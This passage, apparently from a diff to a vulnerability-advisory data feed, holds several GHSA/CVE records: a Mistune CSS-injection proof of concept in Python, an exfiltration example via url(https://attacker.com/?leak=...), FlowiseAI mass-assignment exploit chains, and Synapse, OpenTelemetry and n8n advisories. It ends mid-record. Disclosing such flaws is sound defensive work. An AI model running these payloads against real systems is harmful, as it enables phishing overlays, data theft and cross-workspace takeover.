label\n#   z-index:9999 \u2192 on top of everything\nex_file = \"exploit_h6.md\"\nex_src  = (\n    \"```{image} x.jpg\\n\"\n    \":width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;\"\n    \"background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\\n\"\n    \":alt: \u26a0 CSS INJECTED \u2014 click to dismiss \u26a0\\n\"\n    \"```\\n\"\n)\nwith open(os.path.join(os.getcwd(), ex_file), \"w\") as f:\n    f.write(ex_src)\nex_out = str(md(ex_src))\n\nprint(f\"[{ex_file}]\\n{ex_src}\")\nprint(\"[output \u2014 colour + background-colour + fixed overlay injected into style=]\")\nprint(ex_out)\n\n# --- HTML report ---\nCSS = \"\"\"\nbody{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}\nh1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}\np.desc{color:#555;font-size:.9em;margin-top:6px}\n.warn{background:#fffbeb;border:1px solid #fbbf24;border-radius:6px;padding:10px 16px;\n      font-size:.85em;color:#92400e;margin:12px 0}\n.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;\n      box-shadow:0 1px 4px rgba(0,0,0,.1)}\n.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}\n.baseline .case-header{background:#d1fae5;color:#065f46}\n.exploit  .case-header{background:#fee2e2;color:#7f1d1d}\n.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}\n.panel{padding:16px}\n.panel+.panel{border-left:1px solid #eee}\n.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}\npre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;\n    font-size:.78em;white-space:pre-wrap;word-break:break-all}\n.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}\n.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;\n          background:#fff;font-size:.9em;position:relative;overflow:hidden;height:180px}\n/* scope the live-render sandbox so position:fixed stays inside the box */\n.sandbox{position:relative;width:100%;height:100%}\n.sandbox img{max-width:100%;max-height:100%;object-fit:contain}\n/* override position:fixed on exploit img to keep it inside the preview box */\n.sandbox img[style*=\"position:fixed\"]{position:absolute!important;width:100%!important;\n  height:100%!important;top:0!important;left:0!important}\n\"\"\"\n\ndef case(kind, label, filename, src, out):\n    header = \"BASELINE\" if kind == \"baseline\" else \"EXPLOIT\"\n    sandbox = f'<div class=\"sandbox\">{out}</div>'\n    return f\"\"\"\n<div class=\"case {kind}\">\n  <div class=\"case-header\">{header} \u2014 {h.escape(label)}</div>\n  <div class=\"panels\">\n    <div class=\"panel\">\n      <h3>Input \u2014 {h.escape(filename)}</h3>\n      <pre>{h.escape(src)}</pre>\n    </div>\n    <div class=\"panel\">\n      <h3>Output \u2014 HTML source</h3>\n      <pre>{h.escape(out)}</pre>\n      <div class=\"rlabel\">\u2193 live render (sandboxed to preview box)</div>\n      <div class=\"rendered\">{sandbox}</div>\n    </div>\n  </div>\n</div>\"\"\"\n\npage = f\"\"\"<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">\n<title>H6 \u2014 Image CSS Injection</title><style>{CSS}</style></head><body>\n<h1>H6 \u2014 Image Directive CSS Injection</h1>\n<p class=\"desc\">\n  <code>_parse_attrs()</code> in <code>directives/image.py</code> validates\n  <code>:width:</code> / <code>:height:</code> with <code>_num_re.match()</code>\n  (prefix-only \u2014 no <code>$</code> anchor). Anything after the leading digits\n  is accepted verbatim and written straight into a <code>style=</code> attribute.\n  A single <code>:width:</code> option is sufficient to smuggle an arbitrary\n  CSS chain: <strong>position:fixed \u00b7 background-color \u00b7 outline colour \u00b7 full-viewport overlay</strong>.\n</p>\n<div class=\"warn\">\n  \u26a0 The EXPLOIT preview below is sandboxed inside its box.\n  In a real document the crimson overlay would cover the <em>entire browser window</em>.\n</div>\n{case(\"baseline\",\n      \"Integer dims \u2192 clean width/height= attributes, no style=\",\n      bl_file, bl_src, bl_out)}\n{case(\"exploit\",\n      \":width: carries position:fixed + background-color + outline \u2192 full-viewport coloured overlay\",\n      ex_file, ex_src, ex_out)}\n</body></html>\"\"\"\n\nout_path = os.path.join(os.getcwd(), \"report_h6.html\")\nwith open(out_path, \"w\") as f:\n    f.write(page)\nprint(f\"\\n[report] {out_path}\")\n```\n\nExample usage:\n```bash\npython poc.py\n```\n\nOnce you run the script, open `report_h6.html` in the browser and observe the behaviour.\n\n## Impact\n| Dimension        | Assessment |\n|------------------|-----------|\n| **Confidentiality** | CSS-based data exfiltration via `background-image: url(https://attacker.com/?leak=...)` is possible in some browser/CSP configurations |\n| **Integrity**    | Full-viewport overlay enables complete UI replacement: phishing login forms, fake alerts, click-jacking, brand impersonation |\n| **Availability** | The overlay obscures all page content from the user until dismissed or navigated away |\n\n**Real-world impact scenario:** An attacker posts a Markdown document to a platform (wiki, issue tracker, documentation site) that renders mistune with the Image directive. Any user who views the page sees a full-screen crimson overlay matching the attacker's design, replacing or concealing the legitimate page content. The overlay can contain a convincing login prompt, survey form, or urgent warning designed to capture credentials.",
+      "first_seen": "2026-05-14T18:04:02.409504+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409504+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-ccfx-mfmx-2fx9",
+        "https://github.com/lepture/mistune/releases/tag/v3.2.1",
+        "https://github.com/lepture/mistune/security/advisories/GHSA-ccfx-mfmx-2fx9"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Mistune Image Directive CSS Injection Vulnerability"
+    },
+    {
+      "canonical_id": "CVE-2026-45078",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-400"
+      ],
+      "description": "### Impact\n\nLocal authenticated users can cause Synapse to starve other requests of CPU and lead to other requests failing, causing other users to be denied service.\n\nHomeservers that trust all their local users are not at risk.\n\n### Patches\n\nUpdate to Synapse 1.152.1 or later.\n\n### Workarounds\n\nIf Synapse is deployed behind a reverse proxy, the reverse proxy could be configured to limit the rate of user requests,\npreventing or increasing the difficulty of the attack.\n\n### Identifiers\n\n- ELEMENTSEC-2026-1706\n\n### For more information\n\nIf you have any questions or comments about this advisory, please email us at [security at element.io](mailto:security@element.io).",
+      "first_seen": "2026-05-14T18:04:02.410559+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410559+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-8q93-326v-3m7g",
+        "https://github.com/element-hq/synapse/commit/3f58bc50dfba5768ee43ce48c5e74c25ba0b078a",
+        "https://github.com/element-hq/synapse/issues/19394",
+        "https://github.com/element-hq/synapse/security/advisories/GHSA-8q93-326v-3m7g"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Synapse CPU starvation (Denial of Service)"
+    },
+    {
+      "canonical_id": "CVE-2026-45292",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-770"
+      ],
+      "description": "## Overview\n\nA vulnerability affects the baggage propagation implementation in\n`opentelemetry-api` and `opentelemetry-extension-trace-propagators`. Parsing oversized baggage\ncauses unbounded memory allocation and CPU consumption. Because baggage is automatically\nre-injected into every outgoing request, the effect can fan out to downstream services that\nnever received the original malicious request.\n\n## Technical Details\n\n- `W3CBaggagePropagator` did not enforce any limit on the total size or entry count of the\n  `baggage` header. The parser iterated character-by-character through the entire value\n  regardless of length.\n- `JaegerPropagator` and `OtTracePropagator` had the same gap in their respective baggage\n  extraction paths.\n- The W3C Baggage specification recommends a maximum of 8,192 bytes and 180 entries; none of\n  these limits were enforced.\n\n## Impact\n\nThe practical availability impact for most deployments is limited. Every major Java HTTP server\nenforces its own header size limit (Tomcat, Jetty, Netty, Vert.x, and gRPC-Java all default to\n8 KiB), constraining what an external attacker can deliver before the application is reached.\nThe risk is higher when transport-layer limits are absent \u2014 e.g., a compromised internal service\ncommunicating over a non-HTTP or custom transport.\n\n## Remediation\n\nUpdate to version 1.62.0 or later ([#8380](https://github.com/open-telemetry/opentelemetry-java/pull/8380)).\nThe fix enforces limits consistent with the W3C Baggage specification at the propagator level:\n\n- Maximum total baggage size: 8,192 bytes across all `baggage` header values\n- Maximum number of entries: 64\n\nHeaders that would exceed either limit are dropped at the point the limit is reached;\nalready-extracted valid entries are retained.\n\n## Workarounds\n\nEnsure HTTP header size limits are configured at the server or gateway level. Most Java HTTP\nservers enforce an 8 KiB header limit by default, which mitigates external attack vectors\nindependently of this fix.\n\n## References\n\n- [W3C Baggage Specification \u00a7Limits](https://www.w3.org/TR/baggage/#limits)",
+      "first_seen": "2026-05-14T18:04:02.409591+00:00",
+      "frameworks": [
+        "maven"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409591+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-rcgg-9c38-7xpx",
+        "https://github.com/open-telemetry/opentelemetry-java/commit/03837d3c1763bc35464aea1078671e2ef2336a5f",
+        "https://github.com/open-telemetry/opentelemetry-java/pull/8380",
+        "https://github.com/open-telemetry/opentelemetry-java/releases/tag/v1.62.0",
+        "https://github.com/open-telemetry/opentelemetry-java/security/advisories/GHSA-rcgg-9c38-7xpx"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "OpenTelemetry Java SDK has Unbounded Memory Allocation in W3C Baggage Propagation"
+    },
+    {
+      "canonical_id": "CVE-2026-45732",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-639"
+      ],
+      "description": "## Impact\nThe OAuth1 and OAuth2 credential reconnect endpoints authorized access using `credential:read` rather than `credential:update`. An authenticated user with read-only access to a shared credential could initiate an OAuth reconnect flow and overwrite the stored token material for that credential with tokens bound to an external account they control. Workflows relying on the affected credential would subsequently execute under the attacker's OAuth identity, enabling data exfiltration to attacker-controlled external services and persistent takeover of shared integrations.\n\nThis issue affects instances where credentials are shared with other users or across projects.\n\n## Patches\nThe issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict credential sharing to fully trusted users only.\n- Audit shared credentials for unexpected OAuth token changes and revoke any tokens that may have been replaced.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\n\n---\nn8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N",
+      "first_seen": "2026-05-14T18:04:02.410576+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410576+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-6h4j-wcr9-2vg7",
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-6h4j-wcr9-2vg7"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "n8n Has a Cross-user Authorization Bypass in Dynamic Credential OAuth Endpoints"
+    },
+    {
+      "canonical_id": "GHSA-5h9v-837x-m97r",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-915"
+      ],
+      "description": "## Summary\n\n**Type:** Mass assignment via `Object.assign(entity, body)` -> client-controlled `workspaceId` (and on create, `id`) overwritten on the Dataset entity -> cross-workspace data takeover and IDOR.\n**File:** `packages/server/src/services/dataset/index.ts`\n**Root cause:** The Dataset controller/service constructs a `new Dataset()` and copies the request body into it via `Object.assign(...)` without an explicit field allowlist. The request body therefore can include `workspaceId`, `id`, `createdDate`, `updatedDate`. The server only rebinds *some* of these after the assign (e.g. on create, it overwrites `workspaceId` but not `id`; on update, it overwrites `id` but not `workspaceId`). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the dataset entity's sibling controllers and as `DocumentStore` before it was patched in commit 840d2ae.\n\n## Affected Code\n\n**File:** `packages/server/src/services/dataset/index.ts`\n\n```ts\n// create (line 203) and update (line 226)\nObject.assign(newDataset, body)         // <-- BUG: body.id, body.workspaceId accepted\n```\n\n**Why it's wrong:** `Object.assign(target, source)` copies every own enumerable property of `source` onto `target`. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so `workspaceId` set in the request body lands as the new `workspaceId` of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.\n\n## Exploit Chain\n\n1. Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.\n2. Attacker creates a dataset in workspace A via the documented API (or reuses an existing one they own). They note its entity `id`.\n3. Attacker issues a `PUT /api/v1/datasets/<id>` (or equivalent endpoint) with a JSON body that includes `\"workspaceId\": \"<workspace-B-id>\"` (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.\n4. The controller calls `Object.assign(updateEntity, body)`. The body's `workspaceId` overwrites the entity's `workspaceId` field. The persistence layer commits the row.\n5. Final state: the dataset row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.\n\n## Security Impact\n\n**Severity:** High. Cross-workspace boundary violation by any authenticated workspace member.\n**Attacker capability:** Any authenticated user with permission to update a dataset can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Datasets hold training / evaluation data scoped to a workspace. Moving a Dataset across workspaces via `workspaceId` overwrite exposes the dataset (rows, schema, references) to the destination workspace.\n**Preconditions:** Authenticated session with edit permission for the source dataset. No second factor required. Workspace UUIDs are exposed via the `/api/v1/workspaces` listing or via any cross-referenced object's `workspaceId` field, so target enumeration is trivial.\n**Differential:** PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the `workspaceId` field; vulnerable build accepts it and persists it.\n\n## Suggested Fix\n\nAlready fixed in PR https://github.com/FlowiseAI/Flowise/pull/6051 (allowlist pattern applied).\n\n```ts\n// Allowlist pattern (matches commit 840d2ae for DocumentStore):\nconst updatedDataset = new Dataset()\nif (body.<allowed_field_1> !== undefined) updatedDataset.<allowed_field_1> = body.<allowed_field_1>\nif (body.<allowed_field_2> !== undefined) updatedDataset.<allowed_field_2> = body.<allowed_field_2>\n// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.\n```\n\nRegression tests should assert that a request body containing `workspaceId`, `id`, `createdDate`, or `updatedDate` is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.",
+      "first_seen": "2026-05-14T18:04:02.410433+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410433+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/FlowiseAI/Flowise/commit/49a2259bf2a6b4f3d4b50813cb5161cee0d40040",
+        "https://github.com/FlowiseAI/Flowise/pull/6051",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5h9v-837x-m97r",
+        "https://github.com/advisories/GHSA-5h9v-837x-m97r"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "FlowiseAI: Dataset create+update mass-assignment allows cross-workspace dataset takeover"
+    },
+    {
+      "canonical_id": "GHSA-728h-4mwj-f2p4",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-915"
+      ],
+      "description": "## Summary\n\n**Type:** Mass assignment via `Object.assign(entity, body)` -> client-controlled `workspaceId` (and on create, `id`) overwritten on the CustomTemplate entity -> cross-workspace data takeover and IDOR.\n**File:** `packages/server/src/services/marketplaces/index.ts`\n**Root cause:** The CustomTemplate controller/service constructs a `new CustomTemplate()` and copies the request body into it via `Object.assign(...)` without an explicit field allowlist. The request body therefore can include `workspaceId`, `id`, `createdDate`, `updatedDate`. The server only rebinds *some* of these after the assign (e.g. on create, it overwrites `workspaceId` but not `id`; on update, it overwrites `id` but not `workspaceId`). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the customtemplate entity's sibling controllers and as `DocumentStore` before it was patched in commit 840d2ae.\n\n## Affected Code\n\n**File:** `packages/server/src/services/marketplaces/index.ts`\n\n```ts\n// at line 211\nObject.assign(newTemplate, body)        // <-- BUG: body.id, body.workspaceId accepted\n```\n\n**Why it's wrong:** `Object.assign(target, source)` copies every own enumerable property of `source` onto `target`. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so `workspaceId` set in the request body lands as the new `workspaceId` of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.\n\n## Exploit Chain\n\n1. Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.\n2. Attacker creates a customtemplate in workspace A via the documented API (or reuses an existing one they own). They note its entity `id`.\n3. Attacker issues a `PUT /api/v1/customtemplates/<id>` (or equivalent endpoint) with a JSON body that includes `\"workspaceId\": \"<workspace-B-id>\"` (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.\n4. The controller calls `Object.assign(updateEntity, body)`. The body's `workspaceId` overwrites the entity's `workspaceId` field. The persistence layer commits the row.\n5. Final state: the customtemplate row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.\n\n## Security Impact\n\n**Severity:** High. Cross-workspace boundary violation by any authenticated workspace member.\n**Attacker capability:** Any authenticated user with permission to update a customtemplate can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). CustomTemplates encode reusable workflow templates scoped to a workspace. Cross-workspace movement via `workspaceId` overwrite makes the template appear in another workspace's marketplace listing.\n**Preconditions:** Authenticated session with edit permission for the source customtemplate. No second factor required. Workspace UUIDs are exposed via the `/api/v1/workspaces` listing or via any cross-referenced object's `workspaceId` field, so target enumeration is trivial.\n**Differential:** PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the `workspaceId` field; vulnerable build accepts it and persists it.\n\n## Suggested Fix\n\nAlready fixed in PR https://github.com/FlowiseAI/Flowise/pull/6129 (allowlist pattern applied).\n\n```ts\n// Allowlist pattern (matches commit 840d2ae for DocumentStore):\nconst updatedCustomTemplate = new CustomTemplate()\nif (body.<allowed_field_1> !== undefined) updatedCustomTemplate.<allowed_field_1> = body.<allowed_field_1>\nif (body.<allowed_field_2> !== undefined) updatedCustomTemplate.<allowed_field_2> = body.<allowed_field_2>\n// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.\n```\n\nRegression tests should assert that a request body containing `workspaceId`, `id`, `createdDate`, or `updatedDate` is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.",
+      "first_seen": "2026-05-14T18:04:02.410468+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410468+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/FlowiseAI/Flowise/commit/f64047bdcf4cbd6a30ec348b9e3f2899ff514e89",
+        "https://github.com/FlowiseAI/Flowise/pull/6129",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-728h-4mwj-f2p4",
+        "https://github.com/advisories/GHSA-728h-4mwj-f2p4"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "FlowiseAI: CustomTemplate create+update mass-assignment allows cross-workspace template takeover"
+    },
+    {
+      "canonical_id": "GHSA-78pr-c5x5-jggc",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-915"
+      ],
+      "description": "## Summary\n\n**Type:** Mass assignment via `Object.assign(entity, body)` -> client-controlled `workspaceId` (and on create, `id`) overwritten on the Assistant entity -> cross-workspace data takeover and IDOR.\n**File:** `packages/server/src/services/assistants/index.ts`\n**Root cause:** The Assistant controller/service constructs a `new Assistant()` and copies the request body into it via `Object.assign(...)` without an explicit field allowlist. The request body therefore can include `workspaceId`, `id`, `createdDate`, `updatedDate`. The server only rebinds *some* of these after the assign (e.g. on create, it overwrites `workspaceId` but not `id`; on update, it overwrites `id` but not `workspaceId`). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the assistant entity's sibling controllers and as `DocumentStore` before it was patched in commit 840d2ae.\n\n## Affected Code\n\n**File:** `packages/server/src/services/assistants/index.ts`\n\n```ts\n// create (line 303) and update (line 381)\nObject.assign(newAssistant, requestBody) // <-- BUG: requestBody.id, requestBody.workspaceId accepted\n```\n\n**Why it's wrong:** `Object.assign(target, source)` copies every own enumerable property of `source` onto `target`. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so `workspaceId` set in the request body lands as the new `workspaceId` of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.\n\n## Exploit Chain\n\n1. Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.\n2. Attacker creates a assistant in workspace A via the documented API (or reuses an existing one they own). They note its entity `id`.\n3. Attacker issues a `PUT /api/v1/assistants/<id>` (or equivalent endpoint) with a JSON body that includes `\"workspaceId\": \"<workspace-B-id>\"` (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.\n4. The controller calls `Object.assign(updateEntity, body)`. The body's `workspaceId` overwrites the entity's `workspaceId` field. The persistence layer commits the row.\n5. Final state: the assistant row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.\n\n## Security Impact\n\n**Severity:** High. Cross-workspace boundary violation by any authenticated workspace member.\n**Attacker capability:** Any authenticated user with permission to update a assistant can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Assistants encapsulate LLM configuration, instructions, attached tools, and credentials. Cross-workspace movement via `workspaceId` overwrite exposes the assistant (including its system prompt and tool list) to the destination workspace.\n**Preconditions:** Authenticated session with edit permission for the source assistant. No second factor required. Workspace UUIDs are exposed via the `/api/v1/workspaces` listing or via any cross-referenced object's `workspaceId` field, so target enumeration is trivial.\n**Differential:** PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the `workspaceId` field; vulnerable build accepts it and persists it.\n\n## Suggested Fix\n\nAlready fixed in PR https://github.com/FlowiseAI/Flowise/pull/6128 (allowlist pattern applied).\n\n```ts\n// Allowlist pattern (matches commit 840d2ae for DocumentStore):\nconst updatedAssistant = new Assistant()\nif (body.<allowed_field_1> !== undefined) updatedAssistant.<allowed_field_1> = body.<allowed_field_1>\nif (body.<allowed_field_2> !== undefined) updatedAssistant.<allowed_field_2> = body.<allowed_field_2>\n// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.\n```\n\nRegression tests should assert that a request body containing `workspaceId`, `id`, `createdDate`, or `updatedDate` is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.",
+      "first_seen": "2026-05-14T18:04:02.410503+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410503+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/FlowiseAI/Flowise/commit/1cf247eab35c7c3d4db381d23e4dca682fba527b",
+        "https://github.com/FlowiseAI/Flowise/pull/6128",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-78pr-c5x5-jggc",
+        "https://github.com/advisories/GHSA-78pr-c5x5-jggc"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "FlowiseAI: Assistant create+update mass-assignment allows cross-workspace assistant takeover"
+    },
+    {
+      "canonical_id": "GHSA-7j65-65cr-6644",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-915"
+      ],
+      "description": "## Summary\n\n**Type:** Mass assignment via `Object.assign(entity, body)` -> client-controlled `workspaceId` (and on create, `id`) overwritten on the DatasetRow entity -> cross-workspace data takeover and IDOR.\n**File:** `packages/server/src/services/dataset/index.ts`\n**Root cause:** The DatasetRow controller/service constructs a `new DatasetRow()` and copies the request body into it via `Object.assign(...)` without an explicit field allowlist. The request body therefore can include `workspaceId`, `id`, `createdDate`, `updatedDate`. The server only rebinds *some* of these after the assign (e.g. on create, it overwrites `workspaceId` but not `id`; on update, it overwrites `id` but not `workspaceId`). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the datasetrow entity's sibling controllers and as `DocumentStore` before it was patched in commit 840d2ae.\n\n## Affected Code\n\n**File:** `packages/server/src/services/dataset/index.ts`\n\n```ts\n// create (line 274) and update (line 315)\nObject.assign(newRow, rowBody)          // <-- BUG: rowBody.id, rowBody.datasetId accepted\n```\n\n**Why it's wrong:** `Object.assign(target, source)` copies every own enumerable property of `source` onto `target`. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so `workspaceId` set in the request body lands as the new `workspaceId` of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.\n\n## Exploit Chain\n\n1. Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.\n2. Attacker creates a datasetrow in workspace A via the documented API (or reuses an existing one they own). They note its entity `id`.\n3. Attacker issues a `PUT /api/v1/datasetrows/<id>` (or equivalent endpoint) with a JSON body that includes `\"workspaceId\": \"<workspace-B-id>\"` (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.\n4. The controller calls `Object.assign(updateEntity, body)`. The body's `workspaceId` overwrites the entity's `workspaceId` field. The persistence layer commits the row.\n5. Final state: the datasetrow row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.\n\n## Security Impact\n\n**Severity:** High. Cross-workspace boundary violation by any authenticated workspace member.\n**Attacker capability:** Any authenticated user with permission to update a datasetrow can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). DatasetRows hold individual training/evaluation records. The mass assignment lets a member rebind a row to a Dataset in another workspace via `datasetId`, exposing the row content to the destination workspace.\n**Preconditions:** Authenticated session with edit permission for the source datasetrow. No second factor required. Workspace UUIDs are exposed via the `/api/v1/workspaces` listing or via any cross-referenced object's `workspaceId` field, so target enumeration is trivial.\n**Differential:** PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the `workspaceId` field; vulnerable build accepts it and persists it.\n\n## Suggested Fix\n\nAlready fixed in PR https://github.com/FlowiseAI/Flowise/pull/6051 (allowlist pattern applied).\n\n```ts\n// Allowlist pattern (matches commit 840d2ae for DocumentStore):\nconst updatedDatasetRow = new DatasetRow()\nif (body.<allowed_field_1> !== undefined) updatedDatasetRow.<allowed_field_1> = body.<allowed_field_1>\nif (body.<allowed_field_2> !== undefined) updatedDatasetRow.<allowed_field_2> = body.<allowed_field_2>\n// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.\n```\n\nRegression tests should assert that a request body containing `workspaceId`, `id`, `createdDate`, or `updatedDate` is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.",
+      "first_seen": "2026-05-14T18:04:02.410398+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410398+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/FlowiseAI/Flowise/commit/49a2259bf2a6b4f3d4b50813cb5161cee0d40040",
+        "https://github.com/FlowiseAI/Flowise/pull/6051",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7j65-65cr-6644",
+        "https://github.com/advisories/GHSA-7j65-65cr-6644"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "FlowiseAI: DatasetRow create+update mass-assignment allows cross-workspace row takeover"
+    },
+    {
+      "canonical_id": "GHSA-9m65-766c-r333",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-502",
+        "CWE-843"
+      ],
